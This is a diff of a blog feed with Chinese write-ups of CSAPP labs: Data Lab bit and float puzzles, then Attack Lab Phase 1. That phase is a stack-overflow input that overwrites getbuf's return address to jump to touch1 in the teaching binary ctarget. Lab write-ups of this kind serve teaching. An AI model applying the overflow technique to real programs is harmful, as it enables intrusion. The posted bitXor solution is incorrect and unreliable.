+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">	<span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>);</span><br><span class="line">	<span class="type">int</span> E = <span class="built_in">exp</span> - <span class="number">127</span>;</span><br><span class="line">	frac = frac | (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line">	<span class="keyword">if</span>(E &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(E &gt;= <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(E&lt;<span class="number">23</span>) &#123;</span><br><span class="line">            frac&gt;&gt;=(<span class="number">23</span> - E);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            frac &lt;&lt;= (E - <span class="number">23</span>);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (s)</span><br><span class="line">        <span class="keyword">return</span> ~frac + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h2><ul>
+<li>floatPower2 - Return bit-level equivalent of the expression 2.0^x</li>
+<li>(2.0 raised to the power x) for any 32-bit integer x.</li>
+<li>The unsigned value that is returned should have the identical bit</li>
+<li>representation as the single-precision floating-point number 2.0^x.</li>
+<li>If the result is too small to be represented as a denorm, return 0</li>
+<li>If too large, return +INF.</li>
+<li>Legal ops: Any integer&#x2F;unsigned operations incl. ||, &amp;&amp;. Also if, while </li>
+<li>Max ops: 30</li>
+</ul>
+<p>要做这道题，首先要导出浮点数非规格化和规格化分别表示的浮点数的范围。</p>
+<ol>
+<li><p>非规格化的</p>
+<p>此时，E &#x3D; 1 - Bias &#x3D; 1 - 127 &#x3D; -126, 而$M_{min} &#x3D; 0.00\dots1 &#x3D; 2^{-23}$, 所以非规格化浮点最小为 $2^{-23}\times 2^{-126} &#x3D; 2^{-149}$, $M_{max}&#x3D;2^{-1}+2^{-2}+\dots +2^{-23} &#x3D; 1-2^{-23}$, 所以非规格化浮点最大为 $2^{-126}\times (1-2^{-23})$</p>
+</li>
+<li><p>规格化的</p>
+<p>$M_{min} &#x3D; 1$,  $E_{min} &#x3D; 1-127&#x3D;-126$ 所以规格化的最小为$2^{-126}$</p>
+<p>$M_{max}&#x3D;1.11\dots11$, $E_{MINT}&#x3D;1111\quad1110&#x3D;2^{127}$ 所以规格化最大为不到$2^{128}$</p>
+</li>
+</ol>
+<p>可得下表：</p>
+<table>
+<thead>
+<tr>
+<th align="center">格式</th>
+<th align="center">最小值</th>
+<th align="center">最大值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">规格化</td>
+<td align="center">$2^{-126}$</td>
+<td align="center">$2^{127}\times (2-2^{-23})$</td>
+</tr>
+<tr>
+<td align="center">非规格化</td>
+<td align="center">$2^{-149}$</td>
+<td align="center">$2^{-126}\times (1-2^{-23})$</td>
+</tr>
+</tbody></table>
+<p>所以：</p>
+<ul>
+<li>x &gt; 127 时，返回 Nan</li>
+<li>x &lt;&#x3D; -149时，返回 0</li>
+<li>-126&lt;&#x3D; x &lt;&#x3D;127 时，为规格化的。直接让尾码为全0，控制阶码即可，由 x &#x3D; expr - bias &#x3D;&gt; exp &#x3D; x + 127</li>
+<li>-149 &lt; x &lt; -126 时，为非规格化的，阶码值为 E &#x3D; 1 - bias &#x3D; -126。这时候只能通过控制尾码来计算。由</li>
+</ul>
+<p>$$<br>M\times2^{-126}&#x3D;2^x<br>$$</p>
+<p>知尾码的值是二次幂的形式，所以，尾码的值一定是通过一个“1”左移得到的。尾码各位以2的次幂形式的权值如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/v2-833086860fc45c1b4d6a75121185efdd_720w.jpg" alt="img"></p>
+<p>设1左移n位，则 x+126 &#x3D; -(23 - n)，得 n &#x3D; x + 149</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span>(x &lt; <span class="number">-149</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(x &lt; <span class="number">-126</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span> &lt;&lt; (x + <span class="number">149</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(x &lt;= <span class="number">127</span>)</span><br><span class="line">		<span class="keyword">return</span> (x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> (<span class="number">0xFF</span>) &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="完结纪念："><a href="#完结纪念：" class="headerlink" title="完结纪念："></a>完结纪念：</h1><p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220211234650758.png" alt="btest"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>DataLab 让我了解到我有多么菜。看似简单的数据操作，想要在有限的条件下写得天衣无缝需要敏锐的观察力以及强大的逻辑思维能力。</li>
+<li>本实验耗时5天，约7小时。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CSAPP Lab</category>
+      </categories>
+      <tags>
+        <tag>计算机科学</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CSAPP-Lab02 Bomb Lab 记录</title>
     <url>/2022/02/22/CSAPP-Lab02/</url>
     <content><![CDATA[<blockquote>
@@ -553,388 +945,233 @@
       </tags>
   </entry>
   <entry>
-    <title>CSAPP-Lab01 Data Lab 记录</title>
-    <url>/2022/02/10/CSAPP-Lab01/</url>
-    <content><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/20200409205146245.png" alt="题目列表"></p>
-<h1 id="Problem-int"><a href="#Problem-int" class="headerlink" title="Problem-int"></a>Problem-int</h1><h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><ul>
-<li>bitXor - x^y using only ~ and &amp; </li>
-<li>Example: bitXor(4, 5) &#x3D; 1</li>
-<li>Legal ops: ~ &amp;</li>
-<li>Max ops: 14</li>
-</ul>
-<p>要求只用“非”和“与”来表示“异或”。首先想到“异或的非&#x3D;同或”：<span id="more"></span><br>$$<br>\begin{aligned}x\oplus y&amp;&#x3D;\overline{x}y+x\overline{y}\newline<br>&amp;&#x3D;\overline{\overline{\overline{x}y}\cdot\overline{\overline{y}x}}\newline<br>&amp;&#x3D;\overline{(x+\overline{y})\cdot(\overline{x}+y)}\newline<br>&amp;&#x3D;\overline{xy+\overline{x}\overline{y}}<br>\end{aligned}<br>$$<br>将里面的“或”变成“和”，只需利用德摩根定律：<br>$$<br>\begin{aligned}<br>\overline{xy+\overline{x}\overline{y}}&#x3D;\overline{x\cdot y}\cdot\overline{\overline{x}\cdot\overline{y}}<br>\end{aligned}<br>$$</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> ~(x&amp;y)&amp;(~x&amp;~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><ul>
-<li>tmin - return minimum two’s complement integer </li>
-<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
-<li>Max ops: 4</li>
-</ul>
-<p>对于32位int, Tmin &#x3D; 0x80000000, 将 1 左移31位即可</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h2><ul>
-<li>isTmax - returns 1 if x is the maximum, two’s complement number,</li>
-<li>and 0 otherwise </li>
-<li>Legal ops: ! ~ &amp; ^ | +</li>
-<li>Max ops: 10</li>
-</ul>
-<p>首先，我们知道 Tmax &#x3D; 0x7FFFFFFF, 不难想到求 Tmax+1 &#x3D; Tmin &#x3D; 0x80000000。观察可知，<code>~(Tmax+1) = Tmax</code>，只需判断 <code>~(x+1)</code> 与 x 是否相等即可得出结论。但是，题目要求不能用等于号，于是利用 x^x &#x3D; 0 的性质进行判断，即 <code>return !~(x+1)^x</code>。</p>
-<p>然而，这样是过不了的。仔细揣摩，-1 &#x3D; 0xFFFFFFFF。对其进行加1后，该操作数会被截断，高位进位无效，使得结果为0x00000000，每一位刚好也和-1的每一位互补。因此，x &#x3D; -1的情况是需要特判的。</p>
-<p>在C语言中，非0即为真。利用 x+1&#x3D;0 时结果为假这一特点，当 x &#x3D; -1 时，! (x+1) &#x3D; 1, 再用 ! (x+1) 与 原判式 !$ \sim $(x+1)^x 进行或运算，即 <code>(~(x+1)^x)|!(x+1)</code>, 则该式在 x &#x3D; -1 时一定为真，x !&#x3D; -1 时真假就一定取决于 <code>~(x+1)^x</code> 。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> !(~(x+<span class="number">1</span>)^x|!(x+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h2><ul>
-<li>allOddBits - return 1 if all odd-numbered bits in word set to 1</li>
-<li>where bits are numbered from 0 (least significant) to 31 (most significant)</li>
-<li>Examples allOddBits(0xFFFFFFFD) &#x3D; 0, allOddBits(0xAAAAAAAA) &#x3D; 1</li>
-<li>Legal ops: ! $ \sim $ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
-<li>Max ops: 12</li>
-</ul>
-<p>这道题本身是很简单的，很容易想到构造一个32位的奇数位全为1的数 y &#x3D; 0xAAAAAAAA，将其与 x 进行与运算，如果结果仍为 y, 则 x 的奇数位均为 1.</p>
-<p>但要注意本实验的一个要求：</p>
-<blockquote>
-<p>Integer constants 0 through 255 (0xFF), inclusive. You are not allowed to use big constants such as 0xffffffff.</p>
+    <title>CSAPP-Lab02 Attack Lab 记录</title>
+    <url>/2022/03/03/CSAPP-Lab03/</url>
+    <content><![CDATA[<blockquote>
+<p>纸上得来终觉浅，绝知此事要躬行</p>
 </blockquote>
-<p>考虑先构造0xAA, 然后利用移位操作得到 0xAAAAAAAA。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="type">int</span> y = <span class="number">0xAA</span> + (<span class="number">0xAA</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">	y = y + (y &lt;&lt; <span class="number">16</span>);</span><br><span class="line">	<span class="keyword">return</span> !((x&amp;y)^y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="实验概览"><a href="#实验概览" class="headerlink" title="实验概览"></a>实验概览</h1><p>Attack！，成为一名黑客不正是我小时候的梦想吗？这个实验一定会很有趣。</p>
+<p>CMU 对本实验的官方说明文档：<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf%EF%BC%8C%E6%8C%89%E7%85%A7">http://csapp.cs.cmu.edu/3e/attacklab.pdf，按照</a> CMU 的文档一步步往下走就可以了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220303225536519.png" alt="image-20220303225536519"></p>
+<h1 id="Part-1-Code-Injection-Attacks"><a href="#Part-1-Code-Injection-Attacks" class="headerlink" title="Part 1: Code Injection Attacks"></a>Part 1: Code Injection Attacks</h1><p>在第一部分中，我们要攻击的是<code>ctarget</code>。利用<strong>缓冲区溢出</strong>，就是程序的栈中分配某个字符数组来保存一个字符串，而我们输入的字符串可以包含一些可执行代码的字节编码或者一个指向攻击代码的指针覆盖返回地址。那么就能直接实现直接攻击或者在执行<code>ret</code>指令后跳转到攻击代码。</p>
+<h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先给了<code>test</code>函数的C语言代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><ul>
-<li>negate - return -x </li>
-<li>Example: negate(1) &#x3D; -1.</li>
-<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
-<li>Max ops: 5</li>
-</ul>
-<p>很基础的结论： <code>~x + x = -1</code></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个函数调用了<code>getbuf</code>函数，题目要求我们通过代码注入的方式使<code>getbuf</code>执行结束后不返回到<code>test</code>函数中，而是返回到<code>touch1</code>函数。</p>
+<p><code>touch1</code>的C语言代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h2><ul>
-<li>isAsciiDigit - return 1 if 0x30 &lt;&#x3D; x &lt;&#x3D; 0x39 (ASCII codes for characters ‘0’ to ‘9’)</li>
-<li>Example: <ul>
-<li>isAsciiDigit(0x35) &#x3D; 1</li>
-<li>isAsciiDigit(0x3a) &#x3D; 0</li>
-<li>isAsciiDigit(0x05) &#x3D; 0</li>
-</ul>
-</li>
-<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
-<li>Max ops: 15</li>
-</ul>
-<p>0x30 &#x3D; 0…0 00</p>
-<p>11 0000</p>
-<p>0x39 &#x3D; 0…0 0011 1001</p>
-<ol>
-<li><p>先检查高26位是否全为0，作为条件1</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag1 = !(x &gt;&gt; <span class="number">6</span>);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>再检查中间是否为0011，作为条件2</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag2 = !(<span class="number">0b11</span> ^ (x &gt;&gt; <span class="number">4</span>));</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>最后检查末尾4位是否在0000与1001之间， 先得到最后四位数</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> y = x &amp; (<span class="number">0xF</span>);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>y 在 0 到 9 之间，则 y - 10 &lt; 0，由于符号限制，我们通过移位后判断符号位来作为条件3。由于不能用减法，可以通过<code>-x = ~x +1</code>达到目的</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag3 = (y + ~<span class="number">0xA</span> + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> (!(x &gt;&gt; <span class="number">6</span>)) &amp; (!(<span class="number">0b11</span> ^ (x &gt;&gt; <span class="number">4</span>))) &amp; (((x &amp; (<span class="number">0xF</span>)) + ~<span class="number">0xA</span> + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="反汇编test"><a href="#反汇编test" class="headerlink" title="反汇编test"></a>反汇编<code>test</code></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax</span><br><span class="line">   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt;</span><br><span class="line">   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx</span><br><span class="line">   0x0000000000401978 &lt;+16&gt;:    mov    $0x403188,%esi</span><br><span class="line">   0x000000000040197d &lt;+21&gt;:    mov    $0x1,%edi</span><br><span class="line">   0x0000000000401982 &lt;+26&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000401987 &lt;+31&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x000000000040198c &lt;+36&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x0000000000401990 &lt;+40&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
 
-<h2 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h2><ul>
-<li>conditional - same as x ? y : z </li>
-<li>Example: conditional(2,4,5) &#x3D; 4</li>
-<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
-<li>Max ops: 16</li>
-</ul>
-<p>这个题很基础<br>$$<br>F &#x3D; \overline xz+xy<br>$$<br>先将 x 归整化</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">x = !x</span><br></pre></td></tr></table></figure>
+<p>第2行分配栈帧，第4行调用<code>getbuf</code>函数</p>
+<h3 id="反汇编getbuf"><a href="#反汇编getbuf" class="headerlink" title="反汇编getbuf"></a>反汇编<code>getbuf</code></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
 
-<p>当 $x&#x3D;0$时， y &#x3D; 0x00000001, 考虑 $\sim y+1 &#x3D;$ 0xFFFFFFFF</p>
-<p>当 $x\neq0$时， y &#x3D; 0, 考虑 $~\sim(\sim y+1) &#x3D;$ 0xFFFFFFFF</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> &#123;</span><br><span class="line">	x = ~(!x)+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> (x&amp;z)+(~x&amp;y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分配了40个字节的栈帧，随后将栈顶位置作为参数调用<code>Gets</code>函数，读入字符串。</p>
+<p>此时，栈帧情况是这样的：（以8个字节为单位）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305095612188.png" alt="image-20220305095612188"></p>
+<p>查到<code>touch1</code>代码地址为：<code>0x4017c0</code></p>
+<p>由此就有了思路，我们只需要输入41个字符，前40个字节将<code>getbuf</code>的栈空间填满，最后一个字节将返回值覆盖为<code>0x4017c0</code>即<code>touch1</code>的地址，这样，在<code>getbuf</code>执行<code>retq</code>指令后，程序就会跳转执行<code>touch1</code>函数。</p>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>采用<code>Write up</code>推荐方法，创建一个<code>txt</code>文档存储输入。并按照<code>HEX2RAW</code>工具的说明，在每个字节间用空格或回车隔开。</p>
+<p><strong><code>x86</code>采用小端存储，要注意输入字节的顺序</strong></p>
+<p>我们的输入为：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
 
-<h2 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h2><ul>
-<li>isLessOrEqual - if x &lt;&#x3D; y  then return 1, else return 0 </li>
-<li>Example: isLessOrEqual(4,5) &#x3D; 1.</li>
-<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
-<li>Max ops: 24</li>
-</ul>
-<p>考虑 x - y</p>
-<p>当 y 与 x 同号时，x - y 不会溢出，因此判断 x - y 的符号即可</p>
-<p>当 y 与 x 异号时，x - y 可能会溢出，这时只分别判断 y 和 x 的符号即可</p>
-<p>首先利用移位操作，分别得到 x, y 的符号位。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> signx = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> signy = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p>执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; ctarget01.txt | ./ctarget -q</span><br></pre></td></tr></table></figure>
 
-<ol>
-<li><p>设置情况flag1, x负 y正，满足情况，返回1；x正 y负，返回0</p>
-<table>
-<thead>
-<tr>
-<th align="center">正负</th>
-<th align="center">signx</th>
-<th align="center">signy</th>
-<th align="center">返回值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">x正 y负</td>
-<td align="center">0</td>
-<td align="center">1</td>
-<td align="center">0</td>
-</tr>
-<tr>
-<td align="center">x负 y正</td>
-<td align="center">1</td>
-<td align="center">0</td>
-<td align="center">1</td>
-</tr>
-</tbody></table>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag1 = signx &amp; (!signy)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>在x, y 同号的前提下</strong>，计算 x - y，也就是 <code>x+~y+1</code>, 移位取符号位。</p>
-<p>但是要注意到：x &#x3D; y 时，<code>x+~y+1 = 0</code>的符号位为0，与 x &lt; y 时的符号位为 1 不同，因此，x &#x3D; y 的情况需要特判。</p>
-<p>我在这里用了一种较为巧妙的办法，$x\leq y$ 等价于$x &lt;y + 1$ , 使x &#x3D; y + 1 时，符号位才为0，只需要将<code>x+ ~y+1</code>减 1 即可。</p>
-<p>即最终求 <code>x+~y</code> 的符号位。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> e = signx ^ signy; <span class="comment">//同号</span></span><br><span class="line"><span class="type">int</span> flag2 = ((!e) &amp; ((x + ~y) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>);</span><br></pre></td></tr></table></figure></li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">	<span class="type">int</span> signx = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> signy = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> flag1 = signx &amp; (!signy);</span><br><span class="line">	<span class="type">int</span> e = signx ^ signy; <span class="comment">//同号</span></span><br><span class="line">	<span class="type">int</span> flag2 = ((!e) &amp; ((x + ~y) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> flag1 | flag2;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
-
-<h2 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h2><ul>
-<li>logicalNeg - implement the ! operator, using all of </li>
-<li>the legal operators except !</li>
-<li>Examples: logicalNeg(3) &#x3D; 0, logicalNeg(0) &#x3D; 1</li>
-<li>Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
-<li>Max ops: 12</li>
-</ul>
-<p>当 x &#x3D; 0 时，-x &#x3D; 0，两者符号位相同，而当 $x\neq 0$ 时，-x 与 x 的符号位显然不同，由此就可以解决本题。</p>
-<p>令 x 与 -x 异或，则若 x &#x3D; 0, 则异或后的符号位为0，否则为1，取符号位作为结果，则得到的结果刚好与题目中要求的返回值相反。</p>
-<p>接下来要解决的问题就是实现 0x00000000 与 0x00000001 的相互转换，只需将其取反再加 2 即可</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> ~((((~ x + <span class="number">1</span>) | x) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>) + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>进一步优化：</strong>上述做法使用了 7 个操作符，总给人一种南辕北辙的感觉。原因在于没有利用算术右移的特点</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(~ x + <span class="number">1</span>) | x) &gt;&gt; <span class="number">31</span>;</span><br></pre></td></tr></table></figure>
-
-<p>在这一步中，如果$x\neq 0$, 那么由于符号位为 1 ，右移后的结果便为0x11111111, 令其加 1 ，刚好为 0；显然，当 x &#x3D; 0 时，令结果加 1 ，刚好为 1 。于是，不需要“与”操作来置0高位，在移位完成后直接将结果加 1 ，便可过掉本题</p>
-<p>只用了 5 个操作符</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> (((~ x + <span class="number">1</span>) | x) &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h2><ul>
-<li>howManyBits - return the minimum number of bits required to represent x in</li>
-<li>two’s complement</li>
-<li>Examples: <ul>
-<li>howManyBits(12) &#x3D; 5</li>
-<li>howManyBits(298) &#x3D; 10</li>
-<li>howManyBits(-5) &#x3D; 4</li>
-<li>howManyBits(0)  &#x3D; 1</li>
-<li>howManyBits(-1) &#x3D; 1</li>
-<li>howManyBits(0x80000000) &#x3D; 32</li>
-</ul>
-</li>
-<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
-<li>Max ops: 90</li>
-</ul>
-<p><strong>题意理解</strong></p>
-<p>x 为正数，以八位为例：0011 1010，需找到最高位 1，除此以外，还需一位 0 作为符号位；</p>
-<p>x 为负数，以八位为例：1100 1001，需找到最高位 0，除此以外，还需更高一位 1 作为符号位</p>
-<p><strong>做法</strong></p>
-<ol>
-<li><p>为了统一，不妨当 x 为负数时，将其取反，如上例：$\sim $x &#x3D; 0011 0110, 那么也只需要找到最高位 1 后再加一位就好，这步操作如下</p>
